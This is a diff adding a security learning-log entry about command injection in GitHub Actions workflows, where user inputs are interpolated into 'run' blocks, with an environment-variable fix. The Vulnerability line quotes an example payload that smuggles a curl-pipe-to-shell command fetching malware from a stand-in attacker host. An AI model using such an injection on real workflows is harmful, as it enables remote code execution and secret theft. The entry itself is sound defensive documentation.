@@ -1,0 +1,4 @@
+## 2024-10-18 - Command Injection in GitHub Actions Workflows
+**Vulnerability:** User-controlled input (`github.event.inputs.args`, `github.event.inputs.pull_request`, `github.event.inputs.formula`, `github.event.inputs.timeout`) is passed directly into a `run` block in GitHub Actions workflows. This allows an attacker to inject shell commands by submitting a payload like `1; curl http://attacker.com/malware | sh` into the corresponding input fields when triggering the workflow.
+**Learning:** `run` blocks in GitHub Actions workflows use simple string interpolation. If untrusted input is interpolated into the script, it's evaluated as a shell command.
+**Prevention:** Always bind user-controlled inputs to environment variables and use the environment variables in the `run` block (e.g., `env: ARGS: ${{ github.event.inputs.args }}` and then `run: command "$ARGS"`).
